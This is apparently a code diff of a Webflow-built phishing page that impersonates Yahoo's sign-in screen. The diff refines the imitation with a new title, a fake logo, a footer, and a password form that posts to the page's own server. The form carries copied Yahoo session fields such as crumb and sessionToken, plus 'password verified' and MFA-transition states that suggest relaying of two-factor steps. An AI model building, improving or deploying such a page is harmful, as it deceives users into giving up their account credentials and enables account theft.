@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
+<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211" lang="en">
 <head>
 <meta charset="utf-8">
-<title>Yahoo - Enter Password</title>
+<title>Sign in to Yahoo</title>
 <meta content="width=device-width, initial-scale=1" name="viewport">
 <meta content="Webflow" name="generator">
 <!-- Your Original CSS Paths (Preserved Exactly) -->
-<link href="css/normalize.css" rel="stylesheet" type="text/css">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" rel="stylesheet" type="text/css">
 <link href="css/webflow.css" rel="stylesheet" type="text/css">
 <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
 <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
@@ -23,90 +23,85 @@
 </head>
 <body>
 <!-- Original Body Structure (Preserved) -->
-<section class="section">
-  <div class="div-block">
-    <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
-    <div class="div-block-3">
-      <div class="text-block">Help</div>
-      <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
-      <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
+<div class="yahoo-container">
+    <div class="yahoo-header">
+        <div class="yahoo-logo">
+            <svg width="90" height="32" viewBox="0 0 90 32" fill="none">
+                <path d="M0 0h90v32H0z" fill="#720e9e"/>
+                <text x="45" y="20" text-anchor="middle" fill="white" font-family="Arial" font-size="14" font-weight="bold">Yahoo</text>
+            </svg>
+        </div>
     </div>
-  </div>
-  <div class="layout active">
-    <div class="div-block-5">
-      <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
-      <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
-    </div>
-    <div class="form-block w-form">
-      <!-- Enhanced Form for Seamless Integration -->
-      <form id="email-form" name="email-form" data-name="Email Form" class="form"
-            data-wf-page-id="67c6f50ed426ad7d5847f218"
-            data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
-        
-        <!-- Comprehensive Hidden Fields for Perfect Session Continuity -->
-        <input type="hidden" name="username" id="username">
-        <input type="hidden" name="crumb" id="crumb">
-        <input type="hidden" name="acrumb" id="acrumb">
-        <input type="hidden" name="sessionIndex" id="sessionIndex" value="1">
-        <input type="hidden" name="sessionToken" id="sessionToken">
-        <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
-        <input type="hidden" name="src" value="ym">
-        <input type="hidden" name=".lang" value="en-US">
-        <input type="hidden" name=".intl" value="us">
-        <input type="hidden" name="displayName" id="displayName">
-        <input type="hidden" name="browser-fp-data" id="browser-fp-data">
-        <input type="hidden" name="g-recaptcha-response" value="">
-        <input type="hidden" name="flowName" value="generic">
-        <input type="hidden" name="specId" value="yidReg">
-        <input type="hidden" name="cacheStored" value="1">
-        <input type="hidden" name="timestamp" id="timestamp">
-        <input type="hidden" name="session_bridge" id="session_bridge">
-        
-        <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
-        
-        <div class="pazzi" id="main-form">
-          <div class="reflectto" id="userEmail">Enter your password</div>
-          <h1 class="heading-2"><strong>Enter password</strong></h1>
-          <div class="text-block-2">to finish signing in<br></div>
-          <div class="pazz lpl">Password<br></div>
-          <div class="ms-input-wrap">
-            <input data-show="true" class="ms-input w-input" maxlength="256"
-                   name="passwd" data-name="passwd" placeholder="" type="password"
-                   id="password" data-ms-member="password" required="" autofocus
-                   autocomplete="current-password">
+
+    <div class="yahoo-main">
+        <!-- Main Form -->
+        <div id="main-form" class="yahoo-form-container">
+            <h1 class="yahoo-title">Sign in</h1>
+            <p class="user-info">Sign in using your Yahoo account</p>
+            <p class="user-email" id="userEmail">user@yahoo.com</p>
             
-            <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
-              <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
-                <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
-                <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
-              </div>
-            </div>
-          </div>
-          <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
+            <form id="email-form" name="email-form" data-name="Email Form" class="yahoo-form"
+                  data-wf-page-id="67c6f50ed426ad7d5847f218"
+                  data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d" method="post" action="/account/challenge/password">
+                
+                <!-- Comprehensive Hidden Fields for Perfect Session Continuity -->
+                <input type="hidden" name="username" id="username" value="">
+                <input type="hidden" name="crumb" id="crumb" value="">
+                <input type="hidden" name="acrumb" id="acrumb" value="">
+                <input type="hidden" name="sessionIndex" id="sessionIndex" value="1">
+                <input type="hidden" name="sessionToken" id="sessionToken" value="">
+                <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+                <input type="hidden" name="src" value="ym">
+                <input type="hidden" name=".lang" value="en-US">
+                <input type="hidden" name=".intl" value="us">
+                <input type="hidden" name="displayName" id="displayName" value="">
+                <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="">
+                <input type="hidden" name="g-recaptcha-response" value="">
+                <input type="hidden" name="flowName" value="generic">
+                <input type="hidden" name="specId" value="yidReg">
+                <input type="hidden" name="cacheStored" value="1">
+                <input type="hidden" name="timestamp" id="timestamp" value="">
+                <input type="hidden" name="session_bridge" id="session_bridge" value="">
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="passwd" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="yahoo-btn yahoo-btn-primary">Next</button>
+                
+                <div class="yahoo-links">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+            </form>
         </div>
-        
-        <!-- Enhanced Error State -->
-        <div class="errry" id="error-container" style="display: none;">
-          <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
-          <div class="text-block-7" id="error-message">Invalid password. Please try again.</div>
-          <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
+
+        <!-- Loading State -->
+        <div id="loading-state" class="yahoo-form-container" style="display: none;">
+            <div class="loading-spinner"></div>
+            <h2>Signing you in...</h2>
+            <p>Please wait while we verify your credentials.</p>
         </div>
-        
-        <!-- Seamless Loading State -->
-        <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
-          <div class="loading-spinner"></div>
-          <p>Signing you in...</p>
+
+        <!-- Error Container -->
+        <div id="error-container" class="yahoo-form-container" style="display: none;">
+            <div class="error-icon">⚠️</div>
+            <h2>Sign-in Error</h2>
+            <p id="error-message">Invalid password. Please try again.</p>
+            <button id="refreshButton" class="yahoo-btn yahoo-btn-secondary">Try Again</button>
         </div>
-        
-        <!-- 2FA Transition State -->
-        <div id="mfa-transition" style="display: none; text-align: center; padding: 20px;">
-          <div class="loading-spinner"></div>
-          <p>Preparing verification...</p>
+
+        <!-- MFA Transition -->
+        <div id="mfa-transition" class="yahoo-form-container" style="display: none;">
+            <div class="success-icon">✓</div>
+            <h2>Password Verified</h2>
+            <p>Redirecting to verification step...</p>
         </div>
-      </form>
     </div>
-  </div>
-</section>
+
+    <div class="yahoo-footer">
+        <p>&copy; 2024 Yahoo. All rights reserved.</p>
+    </div>
+</div>
 
 <!-- Original Scripts (Preserved) -->
 <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
